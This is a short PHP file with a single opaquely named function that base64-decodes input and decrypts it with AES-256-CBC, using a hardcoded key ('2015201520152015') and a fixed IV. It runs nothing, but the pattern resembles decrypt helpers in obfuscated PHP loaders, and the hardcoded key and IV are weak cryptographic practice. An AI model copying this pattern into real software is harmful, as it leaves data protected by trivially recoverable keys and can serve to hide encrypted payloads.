<?php
function e7061($e){
	$ed = base64_decode($e);
	$n = openssl_decrypt("$ed","AES-256-CBC","2015201520152015",0,"1231231231231231");
	return $n;
}
?>
